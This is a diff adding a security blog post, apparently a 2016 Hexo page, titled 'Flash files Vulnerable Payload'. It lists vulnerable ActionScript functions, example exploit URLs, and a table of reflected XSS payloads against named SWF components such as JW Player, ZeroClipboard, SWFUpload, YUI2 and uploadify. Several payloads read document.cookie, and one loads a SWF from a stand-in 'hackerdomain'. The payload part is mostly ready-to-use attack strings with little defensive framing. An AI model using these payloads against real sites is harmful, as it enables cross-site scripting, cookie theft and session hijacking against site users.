@@ -1,0 +1,716 @@
+<!doctype html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/vendors/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/vendors/font-awesome/css/font-awesome.min.css?v=4.4.0" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.0.1" rel="stylesheet" type="text/css" />
+
+
+  <meta name="keywords" content="Flash," />
+
+
+
+
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.0.1" />
+
+
+
+
+
+
+<meta name="description" content="https://gist.github.com/cure53/df34ea68c26441f3ae98f821ba1feb9c#intro
+Flashbang12345&amp;gt; git clone https://github.com/cure53/Flashbang --recursive&amp;gt; cd Flashbang/shumway&amp;gt; git submodule init&amp;gt; m">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Flash files Vulnerable Payload">
+<meta property="og:url" content="http://yoursite.com/2016/06/17/Flash-files-Vulnerable-Payload/index.html">
+<meta property="og:site_name" content="xl7dev">
+<meta property="og:description" content="https://gist.github.com/cure53/df34ea68c26441f3ae98f821ba1feb9c#intro
+Flashbang12345&amp;gt; git clone https://github.com/cure53/Flashbang --recursive&amp;gt; cd Flashbang/shumway&amp;gt; git submodule init&amp;gt; m">
+<meta property="og:updated_time" content="2016-06-22T17:59:30.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Flash files Vulnerable Payload">
+<meta name="twitter:description" content="https://gist.github.com/cure53/df34ea68c26441f3ae98f821ba1feb9c#intro
+Flashbang12345&amp;gt; git clone https://github.com/cure53/Flashbang --recursive&amp;gt; cd Flashbang/shumway&amp;gt; git submodule init&amp;gt; m">
+
+
+
+<script type="text/javascript" id="hexo.configuration">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    scheme: 'Muse',
+    sidebar: {"position":"left","display":"post"},
+    fancybox: true,
+    motion: true,
+    duoshuo: {
+      userId: 0,
+      author: 'Author'
+    }
+  };
+</script>
+
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2016/06/17/Flash-files-Vulnerable-Payload/"/>
+
+  <title> Flash files Vulnerable Payload | xl7dev </title>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="">
+
+  
+
+
+
+
+
+
+
+
+
+
+  
+  
+    
+  
+
+  <div class="container one-collumn sidebar-position-left page-post-detail ">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-meta ">
+  
+
+  <div class="custom-logo-site-title">
+    <a href="/"  class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <span class="site-title">xl7dev</span>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+  <p class="site-subtitle">blog</p>
+</div>
+
+<div class="site-nav-toggle">
+  <button>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+  </button>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            Startseite
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            Archiv
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            Tags
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                Flash files Vulnerable Payload
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            <span class="post-meta-item-icon">
+              <i class="fa fa-calendar-o"></i>
+            </span>
+            <span class="post-meta-item-text">Veröffentlicht am</span>
+            <time itemprop="dateCreated" datetime="2016-06-17T11:27:37+08:00" content="2016-06-17">
+              2016-06-17
+            </time>
+          </span>
+
+          
+
+          
+            
+          
+
+          
+
+          
+          
+
+          
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p><a href="https://gist.github.com/cure53/df34ea68c26441f3ae98f821ba1feb9c#intro" target="_blank" rel="external">https://gist.github.com/cure53/df34ea68c26441f3ae98f821ba1feb9c#intro</a></p>
+<h4 id="Flashbang"><a href="#Flashbang" class="headerlink" title="Flashbang"></a>Flashbang</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt; git clone https://github.com/cure53/Flashbang --recursive</span><br><span class="line">&gt; cd Flashbang/shumway</span><br><span class="line">&gt; git submodule init</span><br><span class="line">&gt; make bootstrap</span><br><span class="line">&gt; python -m SimpleHTTPServer 80     # 在Flashbang目录下启动一个Web服务,访问http://127.0.0.1/src/flashbang.html</span><br></pre></td></tr></table></figure>
+<h4 id="FFDec"><a href="#FFDec" class="headerlink" title="FFDec"></a>FFDec</h4><p><a href="https://github.com/jindrapetrik/jpexs-decompiler/releases" target="_blank" rel="external">FFDec</a></p>
+<h4 id="Vul-function"><a href="#Vul-function" class="headerlink" title="Vul function"></a>Vul function</h4><h5 id="1-URLRequest"><a href="#1-URLRequest" class="headerlink" title="1) URLRequest"></a>1) URLRequest</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// as3.0 version</span><br><span class="line">navigateToURL(new URLRequest(link), &quot;_self&quot;);</span><br><span class="line">//as2.0 version</span><br><span class="line">getURL(link,&quot;_self&quot;);</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>example</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=&quot;javascript:alert(1)&quot;&gt;click me&lt;/a&gt;</span><br></pre></td></tr></table></figure>
+<h5 id="2-ExternalInterface-call"><a href="#2-ExternalInterface-call" class="headerlink" title="2) ExternalInterface.call"></a>2) ExternalInterface.call</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">try &#123; __Flash__toXML(函数名(&quot;参数1&quot;)) ; &#125; catch (e) &#123; &quot;&lt;undefined/&gt;&quot;; &#125;</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>example</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">http://www.target.com/ExternalInterface_first.swf?func=a1lert(1))&#125;catch(e)&#123;alert(100)&#125;//</span><br><span class="line"></span><br><span class="line">Output</span><br><span class="line"></span><br><span class="line">try &#123; __Flash__toXML(a1lert(1))&#125;catch(e)&#123;alert(100)&#125;// (&quot;参数1&quot;)) ; &#125; catch (e) &#123; &quot;&lt;undefined/&gt;&quot;; &#125;</span><br><span class="line"></span><br><span class="line">http://www.target.com/ExternalInterface_second.swf?par=1111\%22),al)&#125;catch(e)&#123;alert(1000)&#125;//</span><br><span class="line"></span><br><span class="line">Output</span><br><span class="line"></span><br><span class="line">try &#123; __Flash__toXML(alert(&quot;1111\\&quot;),al&#125;catch(e)&#123;alert(1000)&#125;</span><br></pre></td></tr></table></figure>
+<h4 id="3-htmlText"><a href="#3-htmlText" class="headerlink" title="3) htmlText"></a>3) htmlText</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">_root.createTextField(&quot;Inputbox&quot;,0,20,20,320,240);</span><br><span class="line">_root.Inputbox.html=true;</span><br><span class="line">_root.Inputbox.htmlText=&quot;Welcome&quot; + _root.username;</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>example</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://www.target.com/htmltext.swf?url=?username=&lt;a+href=&quot;javascript:alert(&quot;XSS&quot;)&quot;&gt;click+here+to+win&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">Output</span><br><span class="line"></span><br><span class="line">&quot;Welcome &lt;a href=&quot;javascript:alert(XSS)&quot;&gt;click here to win&lt;/a&gt;&quot;</span><br></pre></td></tr></table></figure>
+<h4 id="4-loadMovie-asfunction"><a href="#4-loadMovie-asfunction" class="headerlink" title="4) loadMovie(), asfunction()"></a>4) loadMovie(), asfunction()</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_root.loadMovie(_root.movietoload)</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.target.com/FlashApp.swf?movietoload=http://hackerdomain/hackedFlash.swf</span><br></pre></td></tr></table></figure>
+<h4 id="5-ExternalInterface-addCallback"><a href="#5-ExternalInterface-addCallback" class="headerlink" title="5) ExternalInterface.addCallback()"></a>5) ExternalInterface.addCallback()</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ExternalInterface.addCallback(&apos;throwException&apos;,</span><br><span class="line">     function(s) &#123;</span><br><span class="line">       throw new Error(s)</span><br><span class="line">     &#125;</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
+<h4 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h4><table>
+<thead>
+<tr>
+<th>Vendor</th>
+<th>url</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Zeroclipboard</td>
+<td>/zeroclipboard.swf?id=\”))}catch(e){alert(1);}//&amp;width=500&amp;height=500&amp;.swf</td>
+</tr>
+<tr>
+<td>JW Player</td>
+<td>/player.swf?playerready=alert(document.cookie)</td>
+</tr>
+<tr>
+<td>JW Player</td>
+<td>/player.swf?tracecall=alert(document.cookie)</td>
+</tr>
+<tr>
+<td>Custom</td>
+<td>/banner.swf?clickTAG=javascript:alert(1);//</td>
+</tr>
+<tr>
+<td>SwfUpload v2.2.0.1</td>
+<td>/swfupload.swf?movieName=”]);}catch(e){}if(!self.a)self.a=!alert(1);//</td>
+</tr>
+<tr>
+<td>YUI2</td>
+<td>/io.swf?yid=\”));}catch(e){alert(1);}//</td>
+</tr>
+<tr>
+<td>Jplayer</td>
+<td>/Jplayer.swf?jQuery=confirm&amp;id=Your information.’)*confirm(document.cookie%2b’&amp;vol=0.8&amp;muted=false&amp;.swf</td>
+</tr>
+<tr>
+<td>player</td>
+<td>/player.swf?playerID=a\%22%29%29}catch%28e%29{alert%28document.domain%29}//</td>
+</tr>
+<tr>
+<td>uploader</td>
+<td>/uploader.swf?allowedDomain=\%22}%29%29%29}catch%28e%29{alert%28document.domain%29;}//</td>
+</tr>
+<tr>
+<td>tagcloud</td>
+<td>/tagcloud.swf?mode=tags&amp;tagcloud=%3Ctags%3E%3Ca+href=’<a href="http://websecurity.com.ua&#39;+style=&#39;font-size:+40pt&#39;%3EClick%20me%3C/a%3E%3C/tags%3E" target="_blank" rel="external">http://websecurity.com.ua&#39;+style=&#39;font-size:+40pt&#39;%3EClick%20me%3C/a%3E%3C/tags%3E</a></td>
+</tr>
+<tr>
+<td>open-flash-chart</td>
+<td>/open-flash-chart.swf?get-data=(function(){alert(/hello/)})()</td>
+</tr>
+<tr>
+<td>io</td>
+<td>/io.swf?yid=\”));}catch(e){alert(9)}//</td>
+</tr>
+<tr>
+<td>uploadify</td>
+<td>/uploadify.swf?buttonText=%3Ca%20href=%27javascript:alert%289%29%27鈥�%3ETest%3C/a%3E</td>
+</tr>
+<tr>
+<td>downloadify</td>
+<td>/downloadify.swf?queue_name=%22))}catch(e){}if(!self.a)self.a=!alert(‘XSS’);//&amp;width&amp;height&amp;downloadImage=<a href="http://www.google.co.in/images/srpr/logo4w.png" target="_blank" rel="external">http://www.google.co.in/images/srpr/logo4w.png</a></td>
+</tr>
+<tr>
+<td>flvPlayer</td>
+<td>/flvPlayer.swf?flvToPlay=xss.xml</td>
+</tr>
+<tr>
+<td>aflax</td>
+<td>/aflax.swf?callback=alert(9)</td>
+</tr>
+<tr>
+<td>redirect</td>
+<td>/redirect.swf?url=javascript:alert(9);</td>
+</tr>
+<tr>
+<td>finnor</td>
+<td>/finnor.swf?clickTag=javascript:alert(1);</td>
+</tr>
+<tr>
+<td>Vulnerable</td>
+<td>/vulnerable.swf?htmlVar=%3Ca%20href%3D%22asfunction%3AgetURL%2Cjavascript%3Aalert%28%27gotcha%21%27%29%22%3E%20Click%20here%3C%2fa%3E</td>
+</tr>
+<tr>
+<td>Pie3D</td>
+<td>/Pie3D.swf?dataURL=xss.xml</td>
+</tr>
+<tr>
+<td>link_protocol_test [only firefox]</td>
+<td>/link_protocol_test.swf?input=data%3Atext%2fhtml%3Btext%2C%3Cscript%3Ealert%28document.domain%29%3B%3C%2fscript%3E%2f%2f</td>
+</tr>
+<tr>
+<td>flashmediaelement &lt; v2.21.1</td>
+<td>/flashmediaelement.swf?jsinitfunctio%gn=alert<code>1</code></td>
+</tr>
+</tbody>
+</table>
+
+      
+    </div>
+
+    <div>
+      
+        
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/Flash/" rel="tag">#Flash</a>
+          
+        </div>
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2016/06/14/DNS-exfiltration-with-SQL-Injection/" rel="next" title="DNS exfiltration with SQL Injection">
+                <i class="fa fa-chevron-left"></i> DNS exfiltration with SQL Injection
+              </a>
+            
+          </div>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2016/06/17/Bypass-imagecopyresampled-and-imagecopyresized-generate-PHP-Webshell/" rel="prev" title="Bypass imagecopyresampled and imagecopyresized generate PHP Webshell ">
+                Bypass imagecopyresampled and imagecopyresized generate PHP Webshell  <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            Inhaltsverzeichnis
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            Übersicht
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel ">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image"
+               src="/images/avatar.gif"
+               alt="xl7dev" />
+          <p class="site-author-name" itemprop="name">xl7dev</p>
+          <p class="site-description motion-element" itemprop="description">Information Security</p>
+        </div>
+        <nav class="site-state motion-element">
+          <div class="site-state-item site-state-posts">
+            <a href="/archives">
+              <span class="site-state-item-count">43</span>
+              <span class="site-state-item-name">Artikel</span>
+            </a>
+          </div>
+
+          
+
+          
+            <div class="site-state-item site-state-tags">
+              <a href="/tags">
+                <span class="site-state-item-count">36</span>
+                <span class="site-state-item-name">Tags</span>
+              </a>
+            </div>
+          
+
+        </nav>
+
+        
+
+        <div class="links-of-author motion-element">
+          
+            
+              <span class="links-of-author-item">
+                <a href="http://blog.knownsec.com" target="_blank" title="Knownsec">
+                  
+                    <i class="fa fa-fw fa-globe"></i>
+                  
+                  Knownsec
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="http://javaweb.org" target="_blank" title="园长">
+                  
+                    <i class="fa fa-fw fa-globe"></i>
+                  
+                  园长
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="http://jeary.org" target="_blank" title="jeary">
+                  
+                    <i class="fa fa-fw fa-globe"></i>
+                  
+                  jeary
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="http://www.thinkings.org" target="_blank" title="Tr3jer">
+                  
+                    <i class="fa fa-fw fa-globe"></i>
+                  
+                  Tr3jer
+                </a>
+              </span>
+            
+          
+        </div>
+
+        
+        
+
+        
+        
+
+      </section>
+
+      
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+            
+              
+            
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#Flashbang"><span class="nav-number">1.</span> <span class="nav-text">Flashbang</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#FFDec"><span class="nav-number">2.</span> <span class="nav-text">FFDec</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Vul-function"><span class="nav-number">3.</span> <span class="nav-text">Vul function</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#1-URLRequest"><span class="nav-number">3.1.</span> <span class="nav-text">1) URLRequest</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#2-ExternalInterface-call"><span class="nav-number">3.2.</span> <span class="nav-text">2) ExternalInterface.call</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-htmlText"><span class="nav-number">4.</span> <span class="nav-text">3) htmlText</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#4-loadMovie-asfunction"><span class="nav-number">5.</span> <span class="nav-text">4) loadMovie(), asfunction()</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#5-ExternalInterface-addCallback"><span class="nav-number">6.</span> <span class="nav-text">5) ExternalInterface.addCallback()</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Payload"><span class="nav-number">7.</span> <span class="nav-text">Payload</span></a></li></ol></div>
+            
+          </div>
+        </section>
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright" >
+  
+  &copy; 
+  <span itemprop="copyrightYear">2016</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">xl7dev</span>
+</div>
+
+<div class="powered-by">
+  Erstellt mit  <a class="theme-link" href="http://hexo.io">Hexo</a>
+</div>
+
+<div class="theme-info">
+  Theme -
+  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
+    NexT.Muse
+  </a>
+</div>
+
+        
+
+        
+      </div>
+    </footer>
+
+    <div class="back-to-top">
+      <i class="fa fa-arrow-up"></i>
+    </div>
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+  
+  <script type="text/javascript" src="/vendors/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/vendors/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/vendors/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/vendors/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/vendors/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/vendors/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.0.1"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.0.1"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.0.1"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.0.1"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.0.1"></script>
+
+
+
+  
+
+
+
+  
+
+
+
+
+  
+  
+  
+
+  
+
+  
+
+</body>
+</html>
